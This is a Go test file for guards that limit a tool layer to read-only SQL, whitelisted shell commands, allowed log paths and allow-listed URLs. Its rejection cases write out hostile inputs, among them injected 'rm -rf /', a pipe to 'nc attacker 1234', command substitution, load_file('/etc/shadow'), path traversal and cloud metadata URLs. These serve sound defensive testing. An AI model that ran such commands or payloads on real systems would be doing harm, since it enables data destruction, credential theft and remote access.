package tools

import (
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestGuardSQLAccepts(t *testing.T) {
	cases := []string{
		"SELECT id FROM job LIMIT 10",
		"select * from job_run where job_id=1 limit 5",
		"SELECT COUNT(*) FROM job LIMIT 1",
		"select a, b from t order by a desc limit 100",
		"select a from t limit 10, 20",
		"select 1 limit 1",
	}
	for _, q := range cases {
		t.Run(q, func(t *testing.T) {
			got, err := GuardSQL(q, 100)
			if err != nil {
				t.Fatalf("应放行: %v", err)
			}
			if got != strings.TrimSpace(q) {
				t.Fatalf("返回值应原样（不做改写）: %q", got)
			}
		})
	}
}

func TestGuardSQLRejects(t *testing.T) {
	cases := []struct {
		name  string
		query string
		want  string
	}{
		{name: "空", query: "   ", want: "SQL 为空"},
		{name: "多语句", query: "select 1 limit 1; drop table job", want: "只允许单条语句"},
		{name: "行注释", query: "select 1 -- 注释\nlimit 1", want: "注释"},
		{name: "块注释绕过", query: "select /*!50000 1 */ limit 1", want: "注释"},
		{name: "井号注释", query: "select 1 # x\nlimit 1", want: "注释"},
		{name: "update", query: "update job set spec='* * * * *' limit 1", want: "只允许 SELECT"},
		{name: "delete", query: "delete from job_run where id=1 limit 1", want: "只允许 SELECT"},
		{name: "drop", query: "select 1 limit 1 drop", want: "禁止关键字"},
		{name: "insert", query: "insert into job values(1) limit 1", want: "只允许 SELECT"},
		{name: "into outfile", query: "select * from job into outfile '/tmp/x' limit 1", want: "禁止关键字"},
		{name: "load_file", query: "select load_file('/etc/shadow') limit 1", want: "禁止关键字"},
		{name: "sleep 拖库", query: "select sleep(30) limit 1", want: "禁止关键字"},
		{name: "get_lock", query: "select get_lock('a',10) limit 1", want: "禁止关键字"},
		{name: "权限", query: "select 1 limit 1 grant", want: "禁止关键字"},
		{name: "事务", query: "select 1 limit 1 begin", want: "禁止关键字"},
		{name: "CTE 不支持", query: "with x as (select 1) select * from x limit 1", want: "只允许 SELECT"},
		{name: "没有 LIMIT", query: "select * from job_run", want: "必须显式带 LIMIT"},
		{name: "LIMIT 超上限", query: "select * from job_run limit 1000", want: "超过上限"},
		{name: "LIMIT 0", query: "select 1 limit 0", want: "必须为正数"},
		{name: "LIMIT 占位符", query: "select 1 limit ?", want: "必须显式带 LIMIT"},
		{name: "分号结尾也算多语句来源", query: "select 1 limit 1;", want: "只允许单条语句"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := GuardSQL(tc.query, 100)
			if err == nil {
				t.Fatal("应拒绝")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("错误 %q 未包含 %q", err.Error(), tc.want)
			}
		})
	}
}

// TestGuardSQLIsConservative 说明一个**已知取舍**：关键字扫描会被字符串字面量误伤。
// 例如查询里带 'update' 字样会被拒绝。这是刻意的：宁可少一种查询，
// 也不要为了"支持字符串里的关键字"而引入解析器级别的复杂度与绕过面。
func TestGuardSQLIsConservative(t *testing.T) {
	_, err := GuardSQL("select 'update' as word from job limit 1", 100)
	if err == nil {
		t.Fatal("含 update 字面量的查询按当前策略应被拒绝（保守取舍）")
	}
	if !strings.Contains(err.Error(), "禁止关键字") {
		t.Fatalf("错误不符: %v", err)
	}
}

func TestGuardShellCommandAllowed(t *testing.T) {
	policy := DefaultPolicy().Normalize()
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{name: "df -h", cmd: "df", args: []string{"-h"}},
		{name: "df 组合短选项", cmd: "df", args: []string{"-hT"}},
		{name: "df 长选项", cmd: "df", args: []string{"--human-readable"}},
		{name: "df 带路径", cmd: "df", args: []string{"-h", "/var"}},
		{name: "df -B 单位", cmd: "df", args: []string{"-B", "1M"}},
		{name: "ps aux", cmd: "ps", args: []string{"aux"}},
		{name: "ps -ef", cmd: "ps", args: []string{"-ef"}},
		{name: "ps -eo", cmd: "ps", args: []string{"-eo", "pid,cmd"}},
		{name: "tail -n 50 日志", cmd: "tail", args: []string{"-n", "50", "/var/log/crony/node.log"}},
		{name: "tail --lines=50 日志", cmd: "tail", args: []string{"--lines=50", "/var/log/crony/node.log"}},
		{name: "tail -50 日志", cmd: "tail", args: []string{"-50", "/var/log/crony/node.log"}},
		{name: "journalctl -u", cmd: "journalctl", args: []string{"-u", "crony-node", "-n", "100", "--no-pager"}},
		{name: "journalctl since", cmd: "journalctl", args: []string{"--since=2024-01-01 00:00:00", "-p", "err"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := GuardShellCommand(tc.cmd, tc.args, policy); err != nil {
				t.Fatalf("应放行: %v", err)
			}
		})
	}
}

func TestGuardShellCommandRejects(t *testing.T) {
	policy := DefaultPolicy().Normalize()
	cases := []struct {
		name string
		cmd  string
		args []string
		want string
	}{
		{name: "rm 不在白名单", cmd: "rm", args: []string{"-rf", "/"}, want: "不在只读白名单"},
		{name: "cat 不在白名单（能读任意文件）", cmd: "cat", args: []string{"/etc/shadow"}, want: "不在只读白名单"},
		{name: "sh 不在白名单", cmd: "sh", args: []string{"-c", "id"}, want: "不在只读白名单"},
		{name: "find 不在白名单（-exec 可执行任意命令）", cmd: "find", args: []string{"/", "-exec", "id", ";"}, want: "不在只读白名单"},
		{name: "分号注入", cmd: "df", args: []string{"-h; rm -rf /"}, want: "元字符"},
		{name: "管道注入", cmd: "df", args: []string{"-h", "|", "nc", "attacker", "1234"}, want: "元字符"},
		{name: "命令替换", cmd: "df", args: []string{"$(id)"}, want: "元字符"},
		{name: "反引号", cmd: "df", args: []string{"`id`"}, want: "元字符"},
		{name: "重定向", cmd: "df", args: []string{"-h", ">/etc/passwd"}, want: "元字符"},
		{name: "tail 读非白名单目录", cmd: "tail", args: []string{"-n", "10", "/etc/shadow"}, want: "不在允许读取的目录"},
		{name: "tail 目录穿越", cmd: "tail", args: []string{"-n", "10", "/var/log/../etc/shadow"}, want: ".."},
		{name: "tail 不支持 -f", cmd: "tail", args: []string{"-f", "/var/log/crony/node.log"}, want: "不支持选项"},
		{name: "tail -n5 歧义写法", cmd: "tail", args: []string{"-n5", "/var/log/crony/node.log"}, want: "必须单独给出取值"},
		{name: "tail 缺少路径", cmd: "tail", args: []string{"-n", "10"}, want: "至少需要"},
		{name: "tail -n 缺取值", cmd: "tail", args: []string{"-n"}, want: "缺少取值"},
		{name: "tail -n 超大", cmd: "tail", args: []string{"-n", "999999", "/var/log/crony/node.log"}, want: "超出范围"},
		{name: "journalctl 不允许 -f（会挂住）", cmd: "journalctl", args: []string{"-f"}, want: "不支持选项"},
		{name: "journalctl 不允许 --rotate（会改状态）", cmd: "journalctl", args: []string{"--rotate"}, want: "不支持选项"},
		{name: "journalctl 不允许 vacuum", cmd: "journalctl", args: []string{"--vacuum-time=1d"}, want: "不支持选项"},
		{name: "journalctl 不允许指定 root", cmd: "journalctl", args: []string{"--root=/mnt"}, want: "不支持选项"},
		{name: "df 相对路径", cmd: "df", args: []string{"etc"}, want: "绝对路径"},
		{name: "df 未知选项", cmd: "df", args: []string{"-Z"}, want: "不支持选项"},
		{name: "参数过多", cmd: "ps", args: []string{"a", "b", "c", "d", "e", "f", "g", "h", "i"}, want: "参数过多"},
		{name: "ps 非法字符", cmd: "ps", args: []string{"a&b"}, want: "元字符"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := GuardShellCommand(tc.cmd, tc.args, policy)
			if err == nil {
				t.Fatal("应拒绝")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("错误 %q 未包含 %q", err.Error(), tc.want)
			}
		})
	}
}

// TestGuardShellPathPolicyIsConfigurable 目录白名单必须来自策略，而不是写死。
func TestGuardShellPathPolicyIsConfigurable(t *testing.T) {
	policy := DefaultPolicy()
	policy.ShellReadPaths = []string{"/data/crony/logs/"}
	if err := GuardShellCommand("tail", []string{"-n", "10", "/data/crony/logs/a.log"}, policy); err != nil {
		t.Fatalf("自定义白名单应生效: %v", err)
	}
	if err := GuardShellCommand("tail", []string{"-n", "10", "/var/log/syslog"}, policy); err == nil {
		t.Fatal("默认目录在自定义策略下应被拒绝")
	}
}

// TestResolveReadPathBlocksSymlinkEscape 软链逃逸必须被拦住。
func TestResolveReadPathBlocksSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	allowed := filepath.Join(root, "allowed")
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(allowed, 0o755); err != nil {
		t.Fatalf("建目录失败: %v", err)
	}
	if err := os.MkdirAll(outside, 0o755); err != nil {
		t.Fatalf("建目录失败: %v", err)
	}
	secret := filepath.Join(outside, "secret.txt")
	if err := os.WriteFile(secret, []byte("top secret"), 0o644); err != nil {
		t.Fatalf("写文件失败: %v", err)
	}
	link := filepath.Join(allowed, "link.log")
	if err := os.Symlink(secret, link); err != nil {
		t.Skipf("当前环境无法创建符号链接（需要特权）: %v", err)
	}
	policy := DefaultPolicy()
	policy.ShellReadPaths = []string{filepath.ToSlash(allowed) + "/"}
	if _, err := ResolveReadPath(link, policy); err == nil {
		t.Fatal("指向白名单外文件的软链应被拒绝")
	}
	normal := filepath.Join(allowed, "ok.log")
	if err := os.WriteFile(normal, []byte("fine"), 0o644); err != nil {
		t.Fatalf("写文件失败: %v", err)
	}
	if _, err := ResolveReadPath(normal, policy); err != nil {
		t.Fatalf("白名单内文件应放行: %v", err)
	}
}

// TestGuardReadPathAbsoluteIsOSAware 锁定"绝对路径判定必须是 OS 感知的"。
//
// 背景：guardReadPath 原来用 `strings.HasPrefix(p, "/")` 判绝对路径（Unix-only），
// 导致 Windows 上 `C:\logs\a.log` 被当成相对路径直接拒绝——文件读取工具在 Windows
// 上拒绝一切绝对路径。本用例在**任何平台**都必须过：白名单内的绝对路径放行、
// 相对路径拒绝、白名单外的绝对路径拒绝。
func TestGuardReadPathAbsoluteIsOSAware(t *testing.T) {
	root := t.TempDir() // 在 Windows 上是 C:\...，在 Linux 上是 /...
	policy := DefaultPolicy()
	policy.ShellReadPaths = []string{filepath.ToSlash(root) + "/"}

	inside := filepath.Join(root, "app.log")
	if err := os.WriteFile(inside, []byte("x"), 0o644); err != nil {
		t.Fatalf("写文件失败: %v", err)
	}
	if err := guardReadPath(inside, policy); err != nil {
		t.Fatalf("白名单内的绝对路径必须放行（Windows 上曾因 Unix-only 判定被拒）: %v", err)
	}

	if err := guardReadPath(filepath.Join("rel", "app.log"), policy); !errors.Is(err, ErrInvalidArgs) {
		t.Fatalf("相对路径必须以 ErrInvalidArgs 拒绝，实际 %v", err)
	}
	// Unix 风格绝对路径也必须被认作绝对（本项目策略默认值是 /var/log 这类 Unix 路径，
	// 而 filepath.IsAbs 在 Windows 上对 "/var/log" 返回 false）
	if err := guardReadPath("/var/log/syslog", Policy{ShellReadPaths: []string{"/var/log/"}}); err != nil {
		t.Fatalf("Unix 风格绝对路径必须放行（Windows 上曾因 filepath.IsAbs 被误判）: %v", err)
	}
	outside := filepath.Join(t.TempDir(), "other.log")
	if err := guardReadPath(outside, policy); !errors.Is(err, ErrToolDenied) {
		t.Fatalf("白名单外的绝对路径必须以 ErrToolDenied 拒绝，实际 %v", err)
	}
	// 目录穿越：必须用**未 Clean 的原始字符串**测（filepath.Join 会自己消掉 `..`）。
	// 含 `..` 一律以 ErrReadonlyViolation 拒绝，不进入白名单前缀比较。
	traversal := root + string(os.PathSeparator) + ".." + string(os.PathSeparator) + "etc" + string(os.PathSeparator) + "shadow"
	if err := guardReadPath(traversal, policy); !errors.Is(err, ErrReadonlyViolation) {
		t.Fatalf("含 .. 的路径必须以 ErrReadonlyViolation 拒绝，实际 %v", err)
	}
	// Clean 之后落在白名单外的绝对路径 → ErrToolDenied（而不是被 Clean"洗白"）
	if err := guardReadPath(filepath.Join(root, "..", "etc", "shadow"), policy); !errors.Is(err, ErrToolDenied) {
		t.Fatalf("Clean 后仍在白名单外必须以 ErrToolDenied 拒绝，实际 %v", err)
	}
}

// TestMatchPathPrefixCaseFoldingOnWindows Windows 路径大小写不敏感，白名单要能命中。
func TestMatchPathPrefixCaseFoldingOnWindows(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("仅在 Windows 上大小写不敏感")
	}
	if !matchPathPrefix("c:/logs/x.log", "C:/Logs/") {
		t.Fatal("Windows 下白名单前缀应大小写不敏感")
	}
	if matchPathPrefix("c:/logs2/x.log", "C:/Logs/") {
		t.Fatal("同前缀但不同目录不得命中")
	}
}

func TestGuardURL(t *testing.T) {
	cases := []struct {
		name    string
		raw     string
		hosts   []string
		wantErr string
	}{
		{name: "空 AllowHosts 默认禁止", raw: "https://example.com/health", hosts: nil, wantErr: "未配置 AllowHosts"},
		{name: "精确匹配", raw: "https://api.example.com/health", hosts: []string{"api.example.com"}},
		{name: "通配子域", raw: "https://a.b.example.com/x", hosts: []string{"*.example.com"}},
		{name: "通配不匹配根域", raw: "https://example.com/x", hosts: []string{"*.example.com"}, wantErr: "不在 AllowHosts"},
		{name: "明确列出根域才放行", raw: "https://example.com/x", hosts: []string{"example.com", "*.example.com"}},
		{name: "ftp 拒绝", raw: "ftp://example.com/x", hosts: []string{"example.com"}, wantErr: "只允许 http/https"},
		{name: "file 协议拒绝", raw: "file:///etc/passwd", hosts: []string{"x"}, wantErr: "只允许 http/https"},
		{name: "URL 带凭据拒绝", raw: "https://user:pass@example.com/x", hosts: []string{"example.com"}, wantErr: "不允许携带用户名/密码"},
		{name: "缺主机名", raw: "https:///path", hosts: []string{"example.com"}, wantErr: "缺少主机名"},
		{name: "本机需显式列出", raw: "http://127.0.0.1:8089/api/statis", hosts: []string{"127.0.0.1"}},
		{name: "本机未列出则拒绝", raw: "http://127.0.0.1:8089/api", hosts: []string{"example.com"}, wantErr: "不在 AllowHosts"},
		{name: "云元数据永久禁止（即使显式列出）", raw: "http://169.254.169.254/latest/meta-data/", hosts: []string{"169.254.169.254"}, wantErr: "永久禁止"},
		{name: "阿里云元数据永久禁止", raw: "http://100.100.100.200/latest/meta-data/", hosts: []string{"100.100.100.200"}, wantErr: "永久禁止"},
		{name: "GCP 元数据永久禁止", raw: "http://metadata.google.internal/computeMetadata/v1/", hosts: []string{"metadata.google.internal"}, wantErr: "永久禁止"},
		{name: "任意 169.254 地址禁止", raw: "http://169.254.10.10/x", hosts: []string{"169.254.10.10"}, wantErr: "链路本地"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := GuardURL(tc.raw, tc.hosts)
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("应放行: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("应拒绝")
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("错误 %q 未包含 %q", err.Error(), tc.wantErr)
			}
		})
	}
}

func TestGuardErrorsAreClassifiable(t *testing.T) {
	// 守卫类错误都是"确定性"的：重试不会改变结果。用哨兵错误保证调用方
	// 可以用 errors.Is 判定，而不是比对字符串。
	_, err := GuardSQL("drop table job limit 1", 100)
	if !errors.Is(err, ErrReadonlyViolation) {
		t.Fatalf("SQL 守卫错误应可用 errors.Is(ErrReadonlyViolation) 判定: %v", err)
	}
	err = GuardShellCommand("rm", []string{"-rf", "/"}, DefaultPolicy())
	if !errors.Is(err, ErrToolDenied) {
		t.Fatalf("白名单外命令应报 ErrToolDenied: %v", err)
	}
	_, err = GuardURL("http://169.254.169.254/", []string{"169.254.169.254"})
	if !errors.Is(err, ErrToolDenied) {
		t.Fatalf("元数据端点应报 ErrToolDenied: %v", err)
	}
	err = GuardShellCommand("tail", []string{"-n", "10", "/etc/shadow"}, DefaultPolicy())
	if !errors.Is(err, ErrToolDenied) {
		t.Fatalf("目录白名单外应报 ErrToolDenied: %v", err)
	}
}

// TestGuardShellCommandProbeCommands 锁定阶段 3 新增的节点侧探测命令白名单。
//
// 这些命令是"admin 让节点跑东西"的唯一入口（node_probe 通道），所以这里
// **既测放行也测拒绝**：只测放行的话，一个 `anyFlag: true` 写错就能把
// `ipconfig /release`（写动作）或 `tasklist /s <远程主机>`（外发动作）放进来。
func TestGuardShellCommandProbeCommands(t *testing.T) {
	policy := DefaultPolicy().Normalize()
	allowed := []struct {
		cmd  string
		args []string
	}{
		{cmd: "netstat", args: []string{"-ano"}},
		{cmd: "netstat", args: []string{"-a", "-n", "-o"}},
		{cmd: "netstat", args: []string{"-p", "tcp"}},
		{cmd: "ss", args: []string{"-lntp"}},
		{cmd: "tasklist", args: []string{"/fi", "imagename eq mysqld.exe"}},
		{cmd: "tasklist", args: []string{"/fo", "list", "/nh"}},
		{cmd: "sc", args: []string{"query", "MySQL84"}},
		{cmd: "sc", args: []string{"qc", "MySQL84"}},
		{cmd: "ipconfig", args: []string{"/all"}},
	}
	for _, tc := range allowed {
		if err := GuardShellCommand(tc.cmd, tc.args, policy); err != nil {
			t.Fatalf("%s %v 应放行: %v", tc.cmd, tc.args, err)
		}
	}

	denied := []struct {
		name string
		cmd  string
		args []string
	}{
		// 写动作：改服务状态、释放/续租 IP、刷新 DNS
		{name: "sc stop", cmd: "sc", args: []string{"stop", "MySQL84"}},
		{name: "sc config", cmd: "sc", args: []string{"config", "MySQL84"}},
		{name: "sc delete", cmd: "sc", args: []string{"delete", "MySQL84"}},
		{name: "ipconfig /release", cmd: "ipconfig", args: []string{"/release"}},
		{name: "ipconfig /renew", cmd: "ipconfig", args: []string{"/renew"}},
		{name: "ipconfig /flushdns", cmd: "ipconfig", args: []string{"/flushdns"}},
		// 外发动作：/s 是对远程主机调用
		{name: "tasklist /s 远程", cmd: "tasklist", args: []string{"/s", "other-host"}},
		// 参数越界
		{name: "netstat 未知开关", cmd: "netstat", args: []string{"-z"}},
		{name: "netstat 协议名错", cmd: "netstat", args: []string{"-p", "icmp"}},
		{name: "tasklist 未知开关", cmd: "tasklist", args: []string{"/x"}},
		{name: "sc 没有子命令", cmd: "sc", args: []string{}},
		// 元字符（即使将来有人改成走 shell 也不会立刻变 RCE）
		{name: "管道", cmd: "netstat", args: []string{"-ano", "|", "findstr", "13307"}},
		{name: "重定向", cmd: "netstat", args: []string{"-ano", ">", "out.txt"}},
		{name: "命令替换", cmd: "tasklist", args: []string{"/fi", "imagename eq $(whoami)"}},
	}
	for _, tc := range denied {
		t.Run(tc.name, func(t *testing.T) {
			err := GuardShellCommand(tc.cmd, tc.args, policy)
			if err == nil {
				t.Fatalf("%s %v 必须被拒绝", tc.cmd, tc.args)
			}
			if !errors.Is(err, ErrToolDenied) && !errors.Is(err, ErrInvalidArgs) {
				t.Fatalf("拒绝原因类型不符: %v", err)
			}
		})
	}
}
